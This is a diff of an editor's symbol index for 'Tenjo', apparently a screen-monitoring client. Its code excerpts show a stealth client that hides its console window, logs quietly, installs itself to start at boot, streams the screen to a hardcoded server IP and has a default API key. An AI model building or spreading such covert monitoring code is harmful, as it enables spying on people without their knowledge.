@@ -149,14 +149,6 @@
         "documentation": {}
     },
     {
-        "label": "datetime",
-        "importPath": "datetime",
-        "description": "datetime",
-        "isExtraImport": true,
-        "detail": "datetime",
-        "documentation": {}
-    },
-    {
         "label": "time",
         "kind": 6,
         "isExtraImport": true,
@@ -199,14 +191,6 @@
         "importPath": "psutil",
         "description": "psutil",
         "detail": "psutil",
-        "documentation": {}
-    },
-    {
-        "label": "Config",
-        "importPath": "core.config",
-        "description": "core.config",
-        "isExtraImport": true,
-        "detail": "core.config",
         "documentation": {}
     },
     {
@@ -392,11 +376,19 @@
         "documentation": {}
     },
     {
-        "label": "ScreenCapture",
-        "importPath": "src.modules.screen_capture",
-        "description": "src.modules.screen_capture",
+        "label": "Config",
+        "importPath": "src.core.config",
+        "description": "src.core.config",
         "isExtraImport": true,
-        "detail": "src.modules.screen_capture",
+        "detail": "src.core.config",
+        "documentation": {}
+    },
+    {
+        "label": "Config",
+        "importPath": "src.core.config",
+        "description": "src.core.config",
+        "isExtraImport": true,
+        "detail": "src.core.config",
         "documentation": {}
     },
     {
@@ -413,22 +405,6 @@
         "description": "src.modules.browser_monitor",
         "isExtraImport": true,
         "detail": "src.modules.browser_monitor",
-        "documentation": {}
-    },
-    {
-        "label": "BrowserMonitor",
-        "importPath": "src.modules.browser_monitor",
-        "description": "src.modules.browser_monitor",
-        "isExtraImport": true,
-        "detail": "src.modules.browser_monitor",
-        "documentation": {}
-    },
-    {
-        "label": "ProcessMonitor",
-        "importPath": "src.modules.process_monitor",
-        "description": "src.modules.process_monitor",
-        "isExtraImport": true,
-        "detail": "src.modules.process_monitor",
         "documentation": {}
     },
     {
@@ -456,11 +432,11 @@
         "documentation": {}
     },
     {
-        "label": "StealthManager",
-        "importPath": "src.utils.stealth",
-        "description": "src.utils.stealth",
+        "label": "StreamHandler",
+        "importPath": "src.modules.stream_handler",
+        "description": "src.modules.stream_handler",
         "isExtraImport": true,
-        "detail": "src.utils.stealth",
+        "detail": "src.modules.stream_handler",
         "documentation": {}
     },
     {
@@ -485,6 +461,49 @@
         "description": "src.utils.api_client",
         "isExtraImport": true,
         "detail": "src.utils.api_client",
+        "documentation": {}
+    },
+    {
+        "label": "APIClient",
+        "importPath": "src.utils.api_client",
+        "description": "src.utils.api_client",
+        "isExtraImport": true,
+        "detail": "src.utils.api_client",
+        "documentation": {}
+    },
+    {
+        "label": "APIClient",
+        "importPath": "src.utils.api_client",
+        "description": "src.utils.api_client",
+        "isExtraImport": true,
+        "detail": "src.utils.api_client",
+        "documentation": {}
+    },
+    {
+        "label": "traceback",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "traceback",
+        "description": "traceback",
+        "detail": "traceback",
+        "documentation": {}
+    },
+    {
+        "label": "asyncio",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "asyncio",
+        "description": "asyncio",
+        "detail": "asyncio",
+        "documentation": {}
+    },
+    {
+        "label": "queue",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "queue",
+        "description": "queue",
+        "detail": "queue",
         "documentation": {}
     },
     {
@@ -634,7 +653,7 @@
         "kind": 6,
         "importPath": "client.src.core.config",
         "description": "client.src.core.config",
-        "peekOfCode": "class Config:\n    # Server Configuration\n    SERVER_URL = os.getenv('TENJO_SERVER_URL', \"http://103.129.149.67\")  # Production server\n    # SERVER_URL = os.getenv('TENJO_SERVER_URL', \"http://127.0.0.1:8000\")  # Local development server\n    API_ENDPOINT = f\"{SERVER_URL}/api\"\n    API_KEY = os.getenv('TENJO_API_KEY', \"tenjo-api-key-2024\")\n    # Client Identification - Dynamic generation based on hardware\n    @staticmethod\n    def generate_client_id():\n        \"\"\"Generate unique client ID based on hardware\"\"\"",
+        "peekOfCode": "class Config:\n    # Server Configuration - PRODUCTION\n    # SERVER_URL = os.getenv('TENJO_SERVER_URL', \"http://103.129.149.67\")  # Production server\n    SERVER_URL = \"http://103.129.149.67\"\n    API_ENDPOINT = f\"{SERVER_URL}/api\"\n    API_KEY = os.getenv('TENJO_API_KEY', \"tenjo-api-key-2024\")\n    # Client Identification - Dynamic generation based on hardware\n    @staticmethod\n    def generate_client_id():\n        \"\"\"Generate unique client ID based on hardware\"\"\"",
         "detail": "client.src.core.config",
         "documentation": {}
     },
@@ -679,8 +698,17 @@
         "kind": 6,
         "importPath": "client.src.modules.stream_handler",
         "description": "client.src.modules.stream_handler",
-        "peekOfCode": "class StreamHandler:\n    def __init__(self, api_client):\n        self.api_client = api_client\n        self.is_streaming = False\n        self.ffmpeg_process = None\n        self.stream_quality = 'medium'  # low, medium, high\n        self.sequence = 0\n        self.stream_thread = None  # Initialize thread reference\n        self.video_streaming = False  # Flag for video streaming mode\n        self.video_thread = None",
+        "peekOfCode": "class StreamHandler:\n    def __init__(self, api_client):\n        self.api_client = api_client\n        self.is_streaming = False\n        self.video_streaming = False\n        self.stream_quality = 'medium'\n        self.sequence = 0\n        self.video_thread = None\n        self.chunks_sent = 0\n        # Enhanced logging",
         "detail": "client.src.modules.stream_handler",
+        "documentation": {}
+    },
+    {
+        "label": "WebRTCStreamHandler",
+        "kind": 6,
+        "importPath": "client.src.modules.webrtc_handler",
+        "description": "client.src.modules.webrtc_handler",
+        "peekOfCode": "class WebRTCStreamHandler:\n    def __init__(self, api_client, client_id):\n        self.api_client = api_client\n        self.client_id = client_id\n        self.is_streaming = False\n        self.websocket = None\n        self.websocket_thread = None\n        self.message_queue = queue.Queue()\n        # Enhanced logging\n        self.logger = logging.getLogger(f\"WebRTCHandler-{client_id}\")",
+        "detail": "client.src.modules.webrtc_handler",
         "documentation": {}
     },
     {
@@ -690,6 +718,33 @@
         "description": "client.src.utils.api_client",
         "peekOfCode": "class APIClient:\n    def __init__(self, server_url, api_key):\n        self.server_url = server_url.rstrip('/')\n        self.api_key = api_key\n        self.client_id = None\n        self.session = requests.Session()\n        # Cache for missing endpoints to avoid spam warnings\n        self._missing_endpoints = set()\n        # Set default headers\n        self.session.headers.update({",
         "detail": "client.src.utils.api_client",
+        "documentation": {}
+    },
+    {
+        "label": "check_screen_recording_permission",
+        "kind": 2,
+        "importPath": "client.src.utils.macos_permissions",
+        "description": "client.src.utils.macos_permissions",
+        "peekOfCode": "def check_screen_recording_permission():\n    \"\"\"Check if screen recording permission is granted on macOS\"\"\"\n    if platform.system() != 'Darwin':\n        return True  # Not macOS, assume permission is granted\n    try:\n        # Try importing macOS specific modules\n        from Quartz import CGMainDisplayID, CGDisplayCreateImage, CGImageRelease\n        from ApplicationServices import kCGNullWindowID\n        # Try to capture a small area of the screen\n        display_id = CGMainDisplayID()",
+        "detail": "client.src.utils.macos_permissions",
+        "documentation": {}
+    },
+    {
+        "label": "request_screen_recording_permission",
+        "kind": 2,
+        "importPath": "client.src.utils.macos_permissions",
+        "description": "client.src.utils.macos_permissions",
+        "peekOfCode": "def request_screen_recording_permission():\n    \"\"\"Show dialog to request screen recording permission\"\"\"\n    if platform.system() != 'Darwin':\n        return True\n    try:\n        from AppKit import NSAlert, NSAlertFirstButtonReturn\n        alert = NSAlert.alloc().init()\n        alert.setMessageText_(\"Screen Recording Permission Required\")\n        alert.setInformativeText_(\n            \"Tenjo needs permission to record your screen for monitoring.\\n\\n\"",
+        "detail": "client.src.utils.macos_permissions",
+        "documentation": {}
+    },
+    {
+        "label": "get_macos_info",
+        "kind": 2,
+        "importPath": "client.src.utils.macos_permissions",
+        "description": "client.src.utils.macos_permissions",
+        "peekOfCode": "def get_macos_info():\n    \"\"\"Get macOS version and system info\"\"\"\n    if platform.system() != 'Darwin':\n        return None\n    try:\n        import subprocess\n        result = subprocess.run(['sw_vers'], capture_output=True, text=True)\n        return result.stdout.strip()\n    except Exception as e:\n        logging.error(f\"Error getting macOS info: {e}\")",
+        "detail": "client.src.utils.macos_permissions",
         "documentation": {}
     },
     {
@@ -711,11 +766,11 @@
         "documentation": {}
     },
     {
-        "label": "TenjoClient",
+        "label": "StealthClient",
         "kind": 6,
         "importPath": "client.main",
         "description": "client.main",
-        "peekOfCode": "class TenjoClient:\n    def __init__(self, stealth_mode=True):\n        # Use API_ENDPOINT from config\n        self.api_client = APIClient(Config.SERVER_URL, Config.CLIENT_ID)\n        self.stealth_manager = StealthManager()\n        self.stealth_mode = stealth_mode\n        # Set up stealth logging if in stealth mode\n        if stealth_mode:\n            self._setup_stealth_logging()\n        # Initialize modules",
+        "peekOfCode": "class StealthClient:\n    def __init__(self):\n        self.api_client = APIClient(Config.SERVER_URL, Config.API_KEY)\n        self.stream_handler = StreamHandler(self.api_client)\n        # Setup stealth logging\n        setup_stealth_logging()\n        self.logger = logging.getLogger('StealthClient')\n        # Hide console in stealth mode\n        if Config.STEALTH_MODE:\n            hide_console_window()",
         "detail": "client.main",
         "documentation": {}
     },
@@ -724,7 +779,34 @@
         "kind": 2,
         "importPath": "client.main",
         "description": "client.main",
-        "peekOfCode": "def signal_handler(signum, frame):\n    \"\"\"Handle shutdown signals gracefully\"\"\"\n    global shutdown_flag\n    logging.info(f\"Received signal {signum}, initiating graceful shutdown...\")\n    shutdown_flag = True\nclass TenjoClient:\n    def __init__(self, stealth_mode=True):\n        # Use API_ENDPOINT from config\n        self.api_client = APIClient(Config.SERVER_URL, Config.CLIENT_ID)\n        self.stealth_manager = StealthManager()",
+        "peekOfCode": "def signal_handler(signum, frame):\n    \"\"\"Handle shutdown signals gracefully\"\"\"\n    global shutdown_flag\n    shutdown_flag = True\ndef setup_stealth_logging():\n    \"\"\"Setup logging for stealth mode - minimal output\"\"\"\n    if Config.STEALTH_MODE:\n        # In stealth mode, log to file only with minimal level\n        log_file = os.path.join(Config.LOG_DIR, 'stealth.log')\n        logging.basicConfig(",
+        "detail": "client.main",
+        "documentation": {}
+    },
+    {
+        "label": "setup_stealth_logging",
+        "kind": 2,
+        "importPath": "client.main",
+        "description": "client.main",
+        "peekOfCode": "def setup_stealth_logging():\n    \"\"\"Setup logging for stealth mode - minimal output\"\"\"\n    if Config.STEALTH_MODE:\n        # In stealth mode, log to file only with minimal level\n        log_file = os.path.join(Config.LOG_DIR, 'stealth.log')\n        logging.basicConfig(\n            level=logging.WARNING,  # Only warnings and errors\n            format='%(asctime)s - %(levelname)s - %(message)s',\n            handlers=[\n                logging.FileHandler(log_file, mode='a'),",
+        "detail": "client.main",
+        "documentation": {}
+    },
+    {
+        "label": "hide_console_window",
+        "kind": 2,
+        "importPath": "client.main",
+        "description": "client.main",
+        "peekOfCode": "def hide_console_window():\n    \"\"\"Hide console window on Windows\"\"\"\n    if platform.system() == \"Windows\":\n        try:\n            import ctypes\n            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)\n        except:\n            pass\ndef install_autostart():\n    \"\"\"Install client to start automatically on system boot\"\"\"",
+        "detail": "client.main",
+        "documentation": {}
+    },
+    {
+        "label": "install_autostart",
+        "kind": 2,
+        "importPath": "client.main",
+        "description": "client.main",
+        "peekOfCode": "def install_autostart():\n    \"\"\"Install client to start automatically on system boot\"\"\"\n    try:\n        current_file = os.path.abspath(__file__)\n        if platform.system() == \"Darwin\":  # macOS\n            # Create LaunchAgent plist\n            plist_dir = os.path.expanduser(\"~/Library/LaunchAgents\")\n            os.makedirs(plist_dir, exist_ok=True)\n            plist_file = os.path.join(plist_dir, \"com.tenjo.client.plist\")\n            plist_content = f\"\"\"<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
         "detail": "client.main",
         "documentation": {}
     },
@@ -733,7 +815,7 @@
         "kind": 2,
         "importPath": "client.main",
         "description": "client.main",
-        "peekOfCode": "def main(stealth_mode=True):\n    \"\"\"Main entry point\"\"\"\n    global shutdown_flag\n    # Register signal handlers for graceful shutdown\n    signal.signal(signal.SIGTERM, signal_handler)\n    signal.signal(signal.SIGINT, signal_handler)\n    client = None\n    try:\n        # Check if running from stealth installation\n        is_stealth = stealth_mode or 'stealth_main.py' in sys.argv[0] or len(sys.argv) > 1 and sys.argv[1] == '--stealth'",
+        "peekOfCode": "def main():\n    \"\"\"Entry point\"\"\"\n    # Set up signal handlers\n    signal.signal(signal.SIGINT, signal_handler)\n    signal.signal(signal.SIGTERM, signal_handler)\n    # Create and run stealth client\n    client = StealthClient()\n    client.run()\nif __name__ == \"__main__\":\n    main()",
         "detail": "client.main",
         "documentation": {}
     },
@@ -742,17 +824,53 @@
         "kind": 5,
         "importPath": "client.main",
         "description": "client.main",
-        "peekOfCode": "shutdown_flag = False\ndef signal_handler(signum, frame):\n    \"\"\"Handle shutdown signals gracefully\"\"\"\n    global shutdown_flag\n    logging.info(f\"Received signal {signum}, initiating graceful shutdown...\")\n    shutdown_flag = True\nclass TenjoClient:\n    def __init__(self, stealth_mode=True):\n        # Use API_ENDPOINT from config\n        self.api_client = APIClient(Config.SERVER_URL, Config.CLIENT_ID)",
+        "peekOfCode": "shutdown_flag = False\ndef signal_handler(signum, frame):\n    \"\"\"Handle shutdown signals gracefully\"\"\"\n    global shutdown_flag\n    shutdown_flag = True\ndef setup_stealth_logging():\n    \"\"\"Setup logging for stealth mode - minimal output\"\"\"\n    if Config.STEALTH_MODE:\n        # In stealth mode, log to file only with minimal level\n        log_file = os.path.join(Config.LOG_DIR, 'stealth.log')",
         "detail": "client.main",
         "documentation": {}
     },
     {
-        "label": "test_auto_video_config",
+        "label": "SimpleClient",
+        "kind": 6,
+        "importPath": "client.main_simple",
+        "description": "client.main_simple",
+        "peekOfCode": "class SimpleClient:\n    def __init__(self):\n        self.api_client = APIClient(Config.SERVER_URL, Config.API_KEY)\n        self.stream_handler = StreamHandler(self.api_client)\n        # Set up logging\n        logging.basicConfig(\n            level=getattr(logging, Config.LOG_LEVEL),\n            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'\n        )\n        self.logger = logging.getLogger('SimpleClient')",
+        "detail": "client.main_simple",
+        "documentation": {}
+    },
+    {
+        "label": "signal_handler",
         "kind": 2,
-        "importPath": "client.test_auto_video",
-        "description": "client.test_auto_video",
-        "peekOfCode": "def test_auto_video_config():\n    \"\"\"Test auto video streaming configuration\"\"\"\n    print(\"Testing Auto Video Streaming Configuration:\")\n    print(f\"AUTO_START_VIDEO_STREAMING: {Config.AUTO_START_VIDEO_STREAMING}\")\n    print(f\"CLIENT_ID: {Config.CLIENT_ID}\")\n    print(f\"SERVER_URL: {Config.SERVER_URL}\")\n    # Test environment variable override\n    os.environ['TENJO_AUTO_VIDEO'] = 'false'\n    # Need to reload config for env var to take effect\n    import importlib",
-        "detail": "client.test_auto_video",
+        "importPath": "client.main_simple",
+        "description": "client.main_simple",
+        "peekOfCode": "def signal_handler(signum, frame):\n    \"\"\"Handle shutdown signals gracefully\"\"\"\n    global shutdown_flag\n    logging.info(f\"Received signal {signum}, initiating graceful shutdown...\")\n    shutdown_flag = True\nclass SimpleClient:\n    def __init__(self):\n        self.api_client = APIClient(Config.SERVER_URL, Config.API_KEY)\n        self.stream_handler = StreamHandler(self.api_client)\n        # Set up logging",
+        "detail": "client.main_simple",
+        "documentation": {}
+    },
+    {
+        "label": "main",
+        "kind": 2,
+        "importPath": "client.main_simple",
+        "description": "client.main_simple",
+        "peekOfCode": "def main():\n    \"\"\"Entry point\"\"\"\n    # Set up signal handlers\n    signal.signal(signal.SIGINT, signal_handler)\n    signal.signal(signal.SIGTERM, signal_handler)\n    # Create and run simple client\n    client = SimpleClient()\n    client.run()\nif __name__ == \"__main__\":\n    main()",
+        "detail": "client.main_simple",
+        "documentation": {}
+    },
+    {
+        "label": "shutdown_flag",
+        "kind": 5,
+        "importPath": "client.main_simple",
+        "description": "client.main_simple",
+        "peekOfCode": "shutdown_flag = False\ndef signal_handler(signum, frame):\n    \"\"\"Handle shutdown signals gracefully\"\"\"\n    global shutdown_flag\n    logging.info(f\"Received signal {signum}, initiating graceful shutdown...\")\n    shutdown_flag = True\nclass SimpleClient:\n    def __init__(self):\n        self.api_client = APIClient(Config.SERVER_URL, Config.API_KEY)\n        self.stream_handler = StreamHandler(self.api_client)",
+        "detail": "client.main_simple",
+        "documentation": {}
+    },
+    {
+        "label": "logger",
+        "kind": 5,
+        "importPath": "client.minimal_client",
+        "description": "client.minimal_client",
+        "peekOfCode": "logger = logging.getLogger(__name__)\ntry:\n    from src.core.config import Config\n    from src.utils.api_client import APIClient\n    logger.info(\"=== ULTRA MINIMAL CLIENT START ===\")\n    logger.info(f\"Server: {Config.SERVER_URL}\")\n    # Create API client\n    api_client = APIClient(Config.SERVER_URL, Config.API_KEY)\n    # Simple heartbeat loop - NO STREAMING\n    loop_count = 0",
+        "detail": "client.minimal_client",
         "documentation": {}
     },
     {
